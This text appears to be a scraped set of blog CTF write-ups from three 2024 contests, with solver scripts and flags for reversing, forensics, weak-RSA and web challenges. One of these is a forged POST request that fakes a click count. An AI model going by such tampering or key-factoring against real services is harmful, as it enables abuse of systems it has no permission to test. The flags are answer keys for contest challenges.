secret Java coffee nut stash! CoffeNutStash.class We are given a .class file and it contains Java bytecode that can be executed, so we just try to run it and the prompt asks to enter a password\n$ java CoffeNutStash Welcome to the Coffee Nut Stash! Enter the password? idk Incorrect password!\rAfterwards, we can use jd-cli to decompile the .class bytecode into the original source code.\n$ dec CoffeNutStash.class 12:05:57.042 INFO com.github.kwart.jd.cli.Main - Decompiling CoffeNutStash.class import java.util.Scanner; public class CoffeNutStash { private static final int[] expected = new int[] { 578, 568, 588, 248, 573, 573, 508, 543, 618, 258, 553, 533, 243, 608, 478, 608, 243, 588, 573, 478, 533, 263, 593, 263, 478, 498, 243, 513, 513, 258, 258, 478, 273, 258, 288, 253, 278, 263, 628 }; public static void main(String[] paramArrayOfString) { System.out.println(\u0026#34;Welcome to the Coffee Nut Stash!\u0026#34;); System.out.println(\u0026#34;Enter the password? \u0026#34;); Scanner scanner = new Scanner(System.in); String str = scanner.next(); scanner.close(); char[] arrayOfChar = str.toCharArray(); if (arrayOfChar.length != expected.length) { System.out.println(\u0026#34;Incorrect password!\u0026#34;); return; } for (byte b = 0; b \u0026lt; arrayOfChar.length; b++) { char c = arrayOfChar[b]; if (c * 5 + 3 != expected[b]) { System.out.println(\u0026#34;Incorrect password!\u0026#34;); return; } } System.out.println(\u0026#34;Correct!\u0026#34;); } }\rFrom the source code, that each character of the password, when multiplied by 5 and added to 3, should equal the corresponding value in the expected array. We can reverse this operation for each value in the expected array.\nsolver.py\r1expected = [578, 568, 588, 248, 573, 573, 508, 543, 618, 258, 553, 533, 243, 608, 478, 608, 243, 588, 573, 478, 533, 263, 593, 263, 478, 498, 243, 513, 513, 258, 258, 478, 273, 258, 288, 253, 278, 263, 628] 2password = \u0026#39;\u0026#39;.join(chr((n - 3) // 5) for n in expected) 3print(password)\rAnd run it\n$ python3 solver.py squ1rrel{3nj0y_y0ur_j4v4_c0ff33_639274}\rFLAG\rsqu1rrel{3nj0y_y0ur_j4v4_c0ff33_639274}\nPYC Fun Overview\rDescription: Have fun with this PYC pyc_fun.pyc Next rev challenge is python bytecode, I use pycdc to decompile it right away.\n$ pycdc pyc_fun.pyc # Source Generated with Decompyle++ # File: pyc_fun.pyc (Python 3.11) Unsupported opcode: JUMP_BACKWARD key = [ 44, 56, 247, 253, 233, 88, 109, 105, 57, 67, 28, 46, 17, 166, 155, 71, 129, 255, 155, 81, 144, 109, 110, 2, 151, 97, 172, 93, 185, 41, 67, 212] result = [ 3807, 2927, 7947, 5457, 6217, 1682, 317, 197, 2647, 2042, 4052, 3087, 3127, 8507, 6742, 1962, 8907, 8267, 9312, 557, 9872, 957, -3, 3727, 6502, 3487, 7947, 2402, 5657, 3167, 2202, 6782] flag = input() # WARNING: Decompyle incomplete\rNah.. It seems the decompilation process is incomplete due to an unsupported opcode: JUMP_BACKWARD.\nReluctantly, we used pycdas to disassemble it, and performed static analysis to get the original source code,\n$ pycdas pyc_fun.pyc pyc_fun.pyc (Python 3.11) [Code] File Name: chal.py Object Name: \u0026lt;module\u0026gt; Qualified Name: \u0026lt;module\u0026gt; Arg Count: 0 Pos Only Arg Count: 0 KW Only Arg Count: 0 Stack Size: 5 Flags: 0x00000000 [Names] \u0026#39;key\u0026#39; \u0026#39;result\u0026#39; \u0026#39;input\u0026#39; \u0026#39;flag\u0026#39; \u0026#39;zip\u0026#39; \u0026#39;r\u0026#39; \u0026#39;k\u0026#39; \u0026#39;c\u0026#39; \u0026#39;ord\u0026#39; \u0026#39;val\u0026#39; \u0026#39;print\u0026#39; \u0026#39;exit\u0026#39; [Locals+Names] [Constants] ( 44 56 247 253 233 88 109 105 57 67 28 46 17 166 155 71 129 255 155 81 144 109 110 2 151 97 172 93 185 41 67 212 ) ( 3807 2927 7947 5457 6217 1682 317 197 2647 2042 4052 3087 3127 8507 6742 1962 8907 8267 9312 557 9872 957 -3 3727 6502 3487 7947 2402 5657 3167 2202 6782 ) 3 5 \u0026#39;Incorrect!\u0026#39; 1 \u0026#39;Correct!\u0026#39; None [Disassembly] 0 RESUME 0 2 BUILD_LIST 0 4 LOAD_CONST 0: (44, 56, 247, 253, 233, 88, 109, 105, 57, 67, 28, 46, 17, 166, 155, 71, 129, 255, 155, 81, 144, 109, 110, 2, 151, 97, 172, 93, 185, 41, 67, 212) 6 LIST_EXTEND 1 8 STORE_NAME 0: key 10 BUILD_LIST 0 12 LOAD_CONST 1: (3807, 2927, 7947, 5457, 6217, 1682, 317, 197, 2647, 2042, 4052, 3087, 3127, 8507, 6742, 1962, 8907, 8267, 9312, 557, 9872, 957, -3, 3727, 6502, 3487, 7947, 2402, 5657, 3167, 2202, 6782) 14 LIST_EXTEND 1 16 STORE_NAME 1: result 18 PUSH_NULL 20 LOAD_NAME 2: input 22 PRECALL 0 26 CALL 0 36 STORE_NAME 3: flag 38 PUSH_NULL 40 LOAD_NAME 4: zip 42 LOAD_NAME 1: result 44 LOAD_NAME 0: key 46 LOAD_NAME 3: flag 48 PRECALL 3 52 CALL 3 62 GET_ITER 64 FOR_ITER 67 (to 200) 66 UNPACK_SEQUENCE 3 70 STORE_NAME 5: r 72 STORE_NAME 6: k 74 STORE_NAME 7: c 76 PUSH_NULL 78 LOAD_NAME 8: ord 80 LOAD_NAME 7: c 82 PRECALL 1 86 CALL 1 96 LOAD_NAME 6: k 98 BINARY_OP 12 (^) 102 STORE_NAME 9: val 104 LOAD_NAME 9: val 106 LOAD_CONST 2: 3 108 BINARY_OP 3 (\u0026lt;\u0026lt;) 112 LOAD_NAME 9: val 114 LOAD_CONST 3: 5 116 BINARY_OP 9 (\u0026gt;\u0026gt;) 120 BINARY_OP 7 (|) 124 STORE_NAME 9: val 126 LOAD_NAME 9: val 128 LOAD_CONST 3: 5 130 BINARY_OP 5 (*) 134 LOAD_CONST 2: 3 136 BINARY_OP 10 (-) 140 STORE_NAME 9: val 142 LOAD_NAME 9: val 144 LOAD_NAME 5: r 146 COMPARE_OP 3 (!=) 152 POP_JUMP_FORWARD_IF_FALSE 22 (to 198) 154 PUSH_NULL 156 LOAD_NAME 10: print 158 LOAD_CONST 4: \u0026#39;Incorrect!\u0026#39; 160 PRECALL 1 164 CALL 1 174 POP_TOP 176 PUSH_NULL 178 LOAD_NAME 11: exit 180 LOAD_CONST 5: 1 182 PRECALL 1 186 CALL 1 196 POP_TOP 198 JUMP_BACKWARD 68 200 PUSH_NULL 202 LOAD_NAME 10: print 204 LOAD_CONST 6: \u0026#39;Correct!\u0026#39; 206 PRECALL 1 210 CALL 1 220 POP_TOP 222 LOAD_CONST 7: None 224 RETURN_VALUE\rAnd here\u0026rsquo;s the last result,\nsolver.py\r1key = [44, 56, 247, 253, 233, 88, 109, 105, 57, 67, 28, 46, 17, 166, 155, 71, 129, 255, 155, 81, 144, 109, 110, 2, 151, 97, 172, 93, 185, 41, 67, 212] 2result = [3807, 2927, 7947, 5457, 6217, 1682, 317, 197, 2647, 2042, 4052, 3087, 3127, 8507, 6742, 1962, 8907, 8267, 9312, 557, 9872, 957, -3, 3727, 6502, 3487, 7947, 2402, 5657, 3167, 2202, 6782] 3 4flag = \u0026#39;\u0026#39; 5 6for r, k in zip(result, key): 7 val = ((r + 3) // 5) 8 val = ((val \u0026gt;\u0026gt; 3) | (val \u0026lt;\u0026lt; 5)) \u0026amp; 0xFF 9 c = chr(val ^ k) 10 flag += c 11 12print(flag)\r$ python3 solve.py sq1urrel{pyc_r3v_1s_fun_56ja4ft}\rFLAG\rsq1urrel{pyc_r3v_1s_fun_56ja4ft}\n","date":"2024-05-04","id":15,"permalink":"/posts/ctfs/2024/squ1rrel-ctf-2024/","summary":"https://ctftime.org/event/2370\nCHALL\u0026rsquo;S SOLVED Category Challenge Crypto Lazy RSA Crypto RSA RSA RSA Misc rainbolt0 Rev Secret Coffee Nut Stash Rev PYC Fun Crypto Lazy RSA Overview\rDescription: Generating primes is too hard, but I did find a couple posted online!","tags":[],"title":"squ1rrel CTF 2024"},{"content":"https://ctftime.org/event/2357\nCHALL\u0026rsquo;S SOLVED Category Challenge Forensics doctor Forensics javai Forensics sgai-1 Forensics undelete Forensics ztxt Forensics doctor Overview\rAuthor: ansh Description: This doc seems to be hiding something. Can you find what\u0026rsquo;s hidden? Flag is in the form CTF{-----_----_----}. SuperSecretWordDoc.docx From the provided docx file, we have to find the flag inside this file.\n$ file SuperSecretWordDoc.docx SuperSecretWordDoc.docx: Microsoft Word 2007+\rI thought it was a docx macro, but when I checked using exiftool, it made me curious.. there\u0026rsquo;s ZIP segment and XML\n$ exiftool SuperSecretWordDoc.docx ExifTool Version Number : 12.40 File Name : SuperSecretWordDoc.docx Directory : . File Size : 3.3 MiB File Modification Date/Time : 2024:05:04 06:40:24+07:00 File Access Date/Time : 2024:05:06 18:26:50+07:00 File Inode Change Date/Time : 2024:05:05 14:01:50+07:00 File Permissions : -rw-r--r-- File Type : DOCX File Type Extension : docx MIME Type : application/vnd.openxmlformats-officedocument.wordprocessingml.document Zip Required Version : 20 Zip Bit Flag : 0 Zip Compression : Deflated Zip Modify Date : 2021:10:04 23:57:02 Zip CRC : 0xd470ebcf Zip Compressed Size : 314 Zip Uncompressed Size : 1119 Zip File Name : [Content_Types].xml\rThen I tried checking using hexedit, it turned out that the ZIP signature (PK) appeared in this docx file\n$ hexedit SuperSecretWordDoc.docx 00000000 50 4B 03 04 14 00 00 00 08 00 21 BF 44 53 CF EB 70 D4 3A 01 PK........!.DS..p.:. 00000014 00 00 5F 04 00 00 13 00 1C 00 5B 43 6F 6E 74 65 6E 74 5F 54 .._.......[Content_T 00000028 79 70 65 73 5D 2E 78 6D 6C 55 54 09 00 03 3E F7 5B 61 3E F7 ypes].xmlUT...\u0026gt;.[a\u0026gt;. 0000003C 5B 61 75 78 0B 00 01 04 F5 01 00 00 04 14 00 00 00 B5 94 4D [aux...............M 00000050 4E C3 30 10 85 4F C0 1D 22 6F 51 E3 96 05 42 A8 69 17 FC 2C N.0..O..\u0026#34;oQ...B.i.., 00000064 81 45 39 C0 D4 99 A4 16 FE 93 3D 2D ED ED 19 A7 6D 04 A8 59 .E9.......=-....m..Y 00000078 20 91 4D E4 F1 9B 79 EF D3 44 C9 7C B9 B7 A6 D8 61 4C DA BB .M...y..D.|....aL.. 0000008C 4A CC CA A9 28 D0 29 5F 6B D7 56 E2 7D F5 3C B9 13 45 22 70 J...(.)_k.V.}.\u0026lt;..E\u0026#34;p 000000A0 35 18 EF B0 12 07 4C 62 B9 B8 9A AF 0E 01 53 C1 C3 2E 55 62 5.....Lb......S...Ub 000000B4 43 14 EE A5 4C 6A 83 16 52 E9 03 3A 56 1A 1F 2D 10 97 B1 95 C...Lj..R..:V..-.... 000000C8 01 D4 07 B4 28 6F A6 D3 5B A9 BC 23 74 34 A1 EC 21 16 F3 47 ....(o..[..#t4..!..G 000000DC 6C 60 6B A8 78 38 DE 67 EB 4A 40 08 46 2B 20 E6 92 6C 26 8A l`k.x8.g.J@.F+ ..l\u0026amp;. 000000F0 A7 3D 8B 47 CC 5C CB 81 39 6D 73 4E 70 ED 8F 89 5C 0F 4D 7C .=.G.\\..9msNp...\\.M| 00000104 4F DA B9 FA 17 FE E4 84 5E 46 34 5D 4F DA E8 90 AE 7F 23 B1 O.......^F4]O.....#. 00000118 9A 72 C2 2B EF 32 EA 1A FF 14 E1 9B 46 2B AC BD DA 5A 1E 29 .r.+.2......F+...Z.) 0000012C 3F 7D AC 43 F4 0A 53 E2 D7 60 4D 99 90 88 4F A7 D4 37 88 F4 ?}.C..S..`M...O..7.. 00000140 02 96 6D 65 EE 94 67 B5 3C AD 65 1C 04 3A 18 1C 02 E8 B4 51 ..me..g.\u0026lt;.e..:.....Q 00000154 E3 1B F6 5A C1 DA E0 65 82 5E 1E 15 C2 6D ED 1A 23 9F 2F 43 ...Z...e.^...m..#./C 00000168 F4 F2 A8 10 BD 62 41 BB CB 20 7D CB 3F 72 10 7F DA 03 CB EF .....bA.. }.?r...... 0000017C A4 E3 73 76 8E 94 DD FF 61 F1 05 50 4B 03 04 0A 00 00 00 00 ..sv....a..PK....... 00000190 00 47 37 45 53 00 00 00 00 00 00 00 00 00 00 00 00 06 00 1C .G7ES............... 000001A4 00 5F 72 65 6C 73 2F 55 54 09 00 03 F5 59 5C 61 E0 5B 5C 61 ._rels/UT....Y\\a.[\\a 000001B8 75 78 0B 00 01 04 F5 01 00 00 04 14 00 00 00 50 4B 03 04 14 ux.............PK... 000001CC 00 00 00 08 00 21 BF 44 53 2D 68 CF 22 B1 00 00 00 2A 01 00 .....!.DS-h.\u0026#34;....*.. 000001E0 00 0B 00 1C 00 5F 72 65 6C 73 2F 2E 72 65 6C 73 55 54 09 00 ....._rels/.relsUT.. 000001F4 03 3E F7 5B 61 3E F7 5B 61 75 78 0B 00 01 04 F5 01 00 00 04 .\u0026gt;.[a\u0026gt;.[aux......... --- SuperSecretWordDoc.docx --0x0/0x35566D--0%-------------------------------------------\rHow about we unzip it\n$ unzip SuperSecretWordDoc.docx Archive: SuperSecretWordDoc.docx inflating: [Content_Types].xml creating: _rels/ inflating: _rels/.rels creating: word/ inflating: word/fontTable.xml inflating: word/document.xml inflating: word/settings.xml inflating: word/numbering.xml inflating: word/styles.xml creating: word/theme/ inflating: word/theme/theme1.xml creating: word/_rels/ inflating: word/_rels/document.xml.rels creating: word/media/ inflating: word/media/image4.png inflating: word/media/image1.png inflating: word/media/image0.png inflating: word/media/image2.png inflating: word/media/image3.png\rThere\u0026rsquo;s some images, we found the flag in image0.png\nFLAG\rCTF{st0ck_cut3_p1c5}\njavai Overview\rAuthor: symmetric Description: Please look over this marketing document on our new JavAI mascot. JavAI.docx Another docx forensics file\n$ file JavAI.docx JavAI.docx: Microsoft Word 2007+\rwhen I check again using, hexedit it gave me the same PK signature\n$ hexedit JavAI.docx 00000000 50 4B 03 04 14 00 00 08 08 00 47 B3 9D 58 AE B8 AA F1 73 02 PK........G..X....s. 00000014 00 00 0A 0D 00 00 12 00 00 00 77 6F 72 64 2F 6E 75 6D 62 65 ..........word/numbe 00000028 72 69 6E 67 2E 78 6D 6C B5 57 5B 8E 9B 30 14 5D 41 F7 80 90 ring.xml.W[..0.]A... 0000003C FA 99 00 09 79 14 0D 99 8F 8E A6 6A 35 AA AA E9 74 01 8E 71 ....y......j5...t..q 00000050 C0 1A 3F D0 B5 81 99 35 74 01 DD 5F 57 52 03 01 26 69 54 41 ..?....5t.._WR..\u0026amp;iTA 00000064 0A 3F 58 DC C7 B9 F7 D8 87 6B 71 73 FB C2 99 95 13 50 54 8A .?X......kqs.....PT. 00000078 D0 F6 E6 AE 6D 11 81 65 44 45 1C DA 3F 9E EE 67 5B DB 52 1A ....m..eDE..?..g[.R. 0000008C 89 08 31 29 48 68 BF 12 65 DF EE DE DD 14 81 C8 F8 9E 80 89 ..1)Hh..e........... 000000A0 B3 0C 84 50 01 C7 A1 9D 68 9D 06 8E A3 70 42 38 52 73 99 12 ...P....h....pB8Rs.. 000000B4 61 9C 07 09 1C 69 F3 0A B1 C3 11 3C 67 E9 0C 4B 9E 22 4D F7 a....i.....\u0026lt;g..K.\u0026#34;M. 000000C8 94 51 FD EA 2C 5C 77 6D 1F 61 64 68 67 20 82 23 C4 8C 53 0C .Q..,\\wm.adhg .#..S. 000000DC 52 C9 83 2E 53 02 79 38 50 4C 8E 4B 93 01 7D EA D6 29 77 12 R...S.y8PL.K..}..)w. 000000F0 67 9C 08 5D 55 74 80 30 D3 83 14 2A A1 A9 6A D0 F8 B5 68 C6 g..]Ut.0...*..j...h. 00000104 99 34 20 F9 BF 48 E4 9C 35 71 45 DA A7 5A 04 A8 30 FB CC 59 .4 ..H..5qE..Z..0..Y 00000118 5D A8 90 10 A5 20 31 51 CA 58 EF 6A 67 8B E8 B9 3D 36 B0 84 ].... 1Q.X.jg...=6.. 0000012C 68 33 FA B4 70 5A B3 E9 84 23 2A 5A 98 52 1D 67 40 6D ED B9 h3..pZ...#*Z.R.g@m.. 00000140 A9 7D DC B4 0A AA 23 D2 ED 85 62 7D 1A A9 5D 0F 74 0F 08 5E .}....#...b}..].t..^ 00000154 FF EE 02 5D B1 9F 6F F3 53 DA 4B C5 67 08 26 4B 67 D0 0A F2 ...]..o.S.K.g.\u0026amp;Kg... 00000168 1A 08 9C 20 D0 0D 00 BB 06 81 49 FC 4C A2 8F 48 E4 A8 15 73 ... ......I.L..H...s 0000017C 14 F7 92 F3 19 52 44 51 0C 88 77 22 55 83 4E D6 73 CF E4 F2 .....RDQ..w\u0026#34;U.N.s... 00000190 3D 41 29 E9 D0 E2 FF 43 FB 04 32 4B 3B B9 FB D7 A0 BD F9 02 =A)....C..2K;....... 000001A4 BD D5 30 80 45 03 B0 33 33 10 ED 95 06 84 F5 D7 8C 5B 27 6F ..0.E..33........[\u0026#39;o 000001B8 9F 23 33 4C AB 10 96 33 E3 A2 66 09 6D B7 B2 98 71 0A DA D8 .#3L...3..f.m...q... 000001CC 72 C4 CA 20 67 57 0F D3 7B DE 1A 23 82 29 47 AC 76 99 CC 27 r.. gW..{..#.)G.v..\u0026#39; 000001E0 F2 D2 FA DE 7B F3 D6 FE 05 37 56 46 0E BA 36 A7 DF A0 5C A8 ....{....7VF..6...\\. 000001F4 88 8C AF 34 87 F6 66 61 A6 7A 11 24 48 C4 D5 58 5F AE DD 32 ...4..fa.z.$H..X_..2 --- JavAI.docx --0x0/0x368DF--0%---------------------------------------------------------\rhow about unzip again?\n$ unzip JavAI.docx Archive: JavAI.docx inflating: word/numbering.xml inflating: word/settings.xml inflating: word/fontTable.xml inflating: word/styles.xml inflating: word/document.xml inflating: word/_rels/document.xml.rels inflating: _rels/.rels inflating: word/theme/theme1.xml inflating: word/media/image1.jpg inflating: [Content_Types].xml creating: META-INF/ extracting: META-INF/MANIFEST.MF inflating: getflag.class\rNice! there\u0026rsquo;s a .class file\nWe gonna use jd-cli to decompile the java .class file\nBefore that, here\u0026rsquo;s my cheatsheet to simplifly execute jd-cli script command and added into ~/.bashrc environment.\nClone \u0026amp; Download JAR jd-cli Github Repo \u0026amp; jd-cli-1.2.1.jar\nAdd jd-cli to .bashrc environment sudo nano ~/.bashrc\n#jd-cli\rfunction dec() {\rjava -jar ~/jd-cli-1.2.1/jd-cli.jar \u0026#34;$@\u0026#34;;\r}\rDecompile \u0026amp; Run dec JavAI.jar -od decompiled -oc\rAnd after that (here\u0026rsquo;s the optional, we can rename it .docx to .jar) if you want, or just execute it straight away\n$ dec JavAI.jar -od decompiled -oc 18:55:24.925 INFO com.github.kwart.jd.cli.Main - Decompiling JavAI.docx 18:55:24.930 INFO com.github.kwart.jd.output.DirOutput - Directory output will be initialized for path decompiled2 public class getflag { public static void main(String[] paramArrayOfString) { System.out.println(\u0026#34;CTF{javai_java_with_100x_ai}\u0026#34;); } } 18:55:25.066 INFO com.github.kwart.jd.output.DirOutput - Finished with 1 class file(s) and 11 resource file(s) written.\rFLAG\rCTF{javai_java_with_100x_ai}\nsgai-1 Overview\rAuthor: symmetric Description: This image from the past may hold the key to our future survival if you can find the hidden flag! (This is flag 1 of 4) sgai.tar.xz I only solve this part one, and it just strings command\n$ strings sgai.sgi | head CTF{i_name_thee_flag} \u0026#34; ! # ! \u0026gt; ? \u0026gt; # % \u0026amp; % # % \u0026#34; $ # ! ! \u0026#34; \u0026#34; \u0026#34;\rFLAG\rCTF{i_name_thee_flag}\nundelete Overview\rAuthor: symmetric Description: Try out this file \u0026lsquo;undelete\u0026rsquo; challenge! It comes with a walkthrough :-) undelete.tar.xz There are 3 ways for me to complete this challenge\nThe first way is create a script to take the offset PNG to IEND from the chall file, here\u0026rsquo;s my script solver.py\r1def extract_png(filename, start, end): 2 with open(filename, \u0026#39;rb\u0026#39;) as f: 3 f.seek(start) 4 png = f.read(end - start) 5 return png 6 7def save_png(png, output_filename): 8 with open(output_filename, \u0026#39;wb\u0026#39;) as f: 9 f.write(png) 10 11def main(): 12 filename = \u0026#39;floppy.img\u0026#39; 13 output_filename = \u0026#39;floppy.png\u0026#39; # Output file name 14 15 # Offsets for the PNG file 16 start = 0x00004400 # PNG header offset 17 end = 0x0000ba00 # IEND chunk offset 18 19 png = extract_png(filename, start, end) 20 save_png(png, output_filename) 21 22if __name__ == \u0026#39;__main__\u0026#39;: 23 main()\rThe second way is using FTK Imager to immediately gain the image, here\u0026rsquo;s the way I should do Open FTK Imager Add Evidence Item Select Source \u0026gt; Image File \u0026gt; Next Browse the floppy.img \u0026gt; Finish And expand all in Evidence tree section And the last of third way is, one and only CyberChef Extract Files Operation, this will produce the of extracted_at_0x4400.png file FLAG\rCTF{144_mb_enough_for_anybody}\nztxt Overview\rAuthor: symmetric Description: Ze zhope zou zan zind zour zlag zin ztext zhunk ztxt.png And the last one that I solve is using exiftool or zsteg\nExiftool\nExiftool\r$ exiftool ztxt.png ExifTool Version Number : 12.40 File Name : ztxt.png Directory : . File Size : 39 KiB File Modification Date/Time : 2024:05:04 05:14:08+07:00 File Access Date/Time : 2024:05:05 15:03:21+07:00 File Inode Change Date/Time : 2024:05:05 15:03:11+07:00 File Permissions : -rw-r--r-- File Type : PNG File Type Extension : png MIME Type : image/png Image Width : 994 Image Height : 317 Bit Depth : 4 Color Type : Palette Compression : Deflate/Inflate Filter : Adaptive Interlace : Noninterlaced Palette : (Binary data 24 bytes, use -b option to extract) Warning : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers) Flag : CTF{zhis_zis_zhe_zlag} Image Size : 994x317 Megapixels : 0.315\rusing zsteg\nzsteg\r$ zsteg ztxt.png meta flag .. text: \u0026#34;CTF{zhis_zis_zhe_zlag}\u0026#34; imagedata .. text: \u0026#34;UUUUUUUUUUUUUUVfffffwvfffffUUUVfUfffUUUUUUUUUEUVeUUUUUUfefeUVfffffVfffffffffffwvUUfffffgvfgvfffffVfgeUUfffUUfffffffffffffVfeUVfffgfffffffgvfffffgvgwwwwfgfwwwwwwwvfffgwvvffwwwwwwvffvffffffggegwvwffeUVfefffUUUVffffffffVfffffffffeUVgfgwffeVffffUUUVfffffffffffUUUfffeUVfffUUVffffUUUUUfffeUfffeUUUVfffffffffffVfVffeUVUUfffffffgfffffffgvfffffeVfffffffveUUffffffffffffefffUUUUUVUUUfeUVUVfgfwgwffffffUfUUUffffeUUffgveffeVffffVffffffwffeUUUUUUUUVfffffffffffffgwffffffffffffUffUfffffeUUfffffwffffffffffUUUff\u0026#34; b2,r,lsb,xy .. file: 5View capture file b2,r,msb,xy .. file: VISX image file b2,b,lsb,xy .. text: \u0026#34;UUUUUUU]U\u0026#34; b4,r,lsb,xy .. text: \u0026#34;UUUUUUU\\\\\u0026#34; b4,r,msb,xy .. text: \u0026#34;wwwwwwwwwwwwww733333\u0026#34; b4,g,lsb,xy .. text: [\u0026#34;3\u0026#34; repeated 20 times] b4,b,lsb,xy .. text: \u0026#34;wwwwwwwwwwwwwwy\u0026#34;\rsolve.sh\r$ cat solve.sh zsteg ztxt.png | grep -o \u0026#39;CTF{[^}]*}\u0026#39; exiftool ztxt.png | grep -o \u0026#39;CTF{[^}]*}\u0026#39; $ chmod +x solve.sh $ ./solve.sh CTF{zhis_zis_zhe_zlag} CTF{zhis_zis_zhe_zlag}\rFLAG\rCTF{zhis_zis_zhe_zlag}\n","date":"2024-05-04","id":16,"permalink":"/posts/ctfs/2024/bsidessf-ctf-2024/","summary":"https://ctftime.org/event/2357\nCHALL\u0026rsquo;S SOLVED Category Challenge Forensics doctor Forensics javai Forensics sgai-1 Forensics undelete Forensics ztxt Forensics doctor Overview\rAuthor: ansh Description: This doc seems to be hiding something.","tags":[],"title":"BSidesSF CTF 2024"},{"content":"https://ctftime.org/event/2302\nCHALL\u0026rsquo;S SOLVED Category Challenge Beginner Basic Reversing Problem Beginner Off-Brand Cookie Clicker Cryptography RSA-256 Forensics Contracts Beginner Basic Reversing Problem Overview\rAuthor: By Khael (@malfuncti0nal on discord) Description: So many function calls\u0026hellip; but are they that different? baby-rev In this basic reverse challenge we are given a binary file and after debugging it, there are many functions that we get afterwards\n$ gdb ./baby-rev gef➤ info functions All defined functions: Non-debugging symbols: 0x0000000000001000 _init 0x0000000000001040 __cxa_finalize@plt 0x0000000000001050 __stack_chk_fail@plt 0x0000000000001060 _start 0x0000000000001090 deregister_tm_clones 0x00000000000010c0 register_tm_clones 0x0000000000001100 __do_global_dtors_aux 0x0000000000001140 frame_dummy 0x0000000000001149 l1 0x0000000000001178 l2 0x00000000000011a7 l3 0x00000000000011d6 l4 0x0000000000001205 l5 0x0000000000001234 l6 0x0000000000001263 l7 0x0000000000001292 l8 0x00000000000012c1 l9 0x00000000000012f0 l10 0x000000000000131f l11 0x000000000000134e l12 0x000000000000137d l13 0x00000000000013ac l14 0x00000000000013db l15 0x000000000000140a l16 0x0000000000001439 l17 0x0000000000001468 l18 0x0000000000001497 l19 0x00000000000014ad keygen 0x00000000000014eb main 0x0000000000001510 __libc_csu_init 0x0000000000001580 __libc_csu_fini 0x0000000000001588 _fini\rWe can use Ghidra/IDA to see the decompiled version\ndecompiled function: l1\rvoid l1(undefined *param_1) { *param_1 = 0x75; l2(param_1 + 1); return; } void l2(undefined *param_1) { *param_1 = 0x74; l3(param_1 + 1); return; } void l3(undefined *param_1) { *param_1 = 0x66; l4(param_1 + 1); return; } ... void l18(undefined *param_1) { *param_1 = 0x7d; l19(param_1 + 1); return; }\rSo.. if we decode hex value of l1 \u0026hellip; l18 functions one by one we can get the part of flag\n$ python3 \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(\u0026#39;75 74 66 6c 61 67\u0026#39;).decode(\u0026#39;utf-8\u0026#39;) \u0026#39;utflag\u0026#39; \u0026gt;\u0026gt;\u0026gt;\rFinal solver\n\u0026gt;\u0026gt;\u0026gt; vals = [0x75, 0x74, 0x66, 0x6c, 0x61, 0x67, 0x7b, 0x69, 0x5f, 99, 0x34, 0x6e, 0x5f, 0x72, 0x33, 0x76, 0x21 , 0x7d] \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; print(\u0026#39;\u0026#39;.join(chr(value) for value in vals)) utflag{i_c4n_r3v!}\rFLAG\rutflag{i_c4n_r3v!}\nOff-Brand Cookie Clicker Overview\rAuthor: By Khael (@malfuncti0nal on discord) Description: I tried to make my own version of cookie clicker, without all of the extra fluff. Can you beat my highscore? http://betta.utctf.live:8138/ From the provided link, we have to exceed 10,000,000 clicks.\nIt displays this count on an HTML element with the id clickCount. An event listener is added to an HTML element with the id cookieImage.\nWhen this element is clicked, the count is incremented \u0026amp; the new count is displayed and stored in the local storage. If the count reaches or exceeds 10,000,000, a POST request is sent to the /click endpoint with the count as the body of the request.\nsolver.py\r1import requests 2 3url = \u0026#34;http://betta.utctf.live:8138/click\u0026#34; 4 5headers = { 6 \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39; 7} 8 9data = { 10 \u0026#39;count\u0026#39;: 10000000 11} 12 13response = requests.post(url, headers=headers, data=data) 14 15print(response.json())\r$ python3 solve.py {\u0026#39;flag\u0026#39;: \u0026#39;Wow, you beat me. Congrats! utflag{y0u_cl1ck_pr3tty_f4st}\u0026#39;}\rFLAG\rutflag{y0u_cl1ck_pr3tty_f4st}\nCryptography RSA-256 Overview\rAuthor: By Jeriah (@jyu on discord) Description: Based on the military-grade encryption offered by AES-256, RSA-256 will usher in a new era of cutting-edge security\u0026hellip; or at least, better security than RSA-128. vals.txt From the given source. The values are:\nN: the modulus for both the public and private keys e: the public exponent c: the ciphertext want to decrypt N = 77483692467084448965814418730866278616923517800664484047176015901835675610073\re = 65537\rc = 43711206624343807006656378470987868686365943634542525258065694164173101323321\rTo solve this, we would factorize N into two prime numbers, p and q. This is often the most time-consuming step, especially when N is a large number. Alternatively, we can use online factorization tools such as FactorDB. Just enter the number and it will return the factors.\nAfter we get the factors of N. Here\u0026rsquo;s the optional step that might check whether p and q are indeed factors of N.\nN = 77483692467084448965814418730866278616923517800664484047176015901835675610073 p = 1025252665848145091840062845209085931 q = 75575216771551332467177108987001026743883 if p * q == N: print(\u0026#34;p * q == N\u0026#34;) else: print(\u0026#34;p * q != N\u0026#34;)\rFinal solver\nsolver.py\r1from Crypto.Util.number import inverse, long_to_bytes 2 3# given values 4N = 77483692467084448965814418730866278616923517800664484047176015901835675610073 5e = 65537 6c = 43711206624343807006656378470987868686365943634542525258065694164173101323321 7 8# factorized (N) with factordb.com 9p = 1025252665848145091840062845209085931 10q = 75575216771551332467177108987001026743883 11 12phi = (p - 1) * (q - 1) 13d = inverse(e, phi) 14m = pow(c, d, N) 15 16message = long_to_bytes(m) 17print(message)\r$ python3 solve.py b\u0026#39;utflag{just_send_plaintext}\u0026#39;\rFLAG\rutflag{just_send_plaintext}\nForensics Contracts Overview\rAuthor: By Samintell (@samintell on discord) Description: Magical contracts are hard. Occasionally, you sign with the flag instead of your name. It happens. document.pdf Given the forensics challenge, and provided PDF document\nTrying various ways to search flags, such as searching for all uppercase letters, but it didn\u0026rsquo;t work\n$ pdftotext file.pdf output.txt $ grep -o \u0026#39;[A-Z]\u0026#39; output.txt\rSo, after searching for PDF forensics tools, we found a tool that was suitable for solving this by extracting images from PDF using pdfimages\n$ mkdir ext \u0026amp;\u0026amp; pdfimages -all document.pdf out \u0026amp;\u0026amp; mv out* ext $ ls ext/ out-000.jpg out-002.jpg out-004.png out-006.png out-008.png out-001.jpg out-003.png out-005.png out-007.png\rWe got several extracted image, and one of them there was an image that contained a flag\nFLAG\rutctf{s1mple_w1z4rding_mist4k3s}\n","date":"2024-03-31","id":17,"permalink":"/posts/ctfs/2024/utctf-2024/","summary":"https://ctftime.org/event/2302\nCHALL\u0026rsquo;S SOLVED Category Challenge Beginner Basic Reversing Problem Beginner Off-Brand Cookie 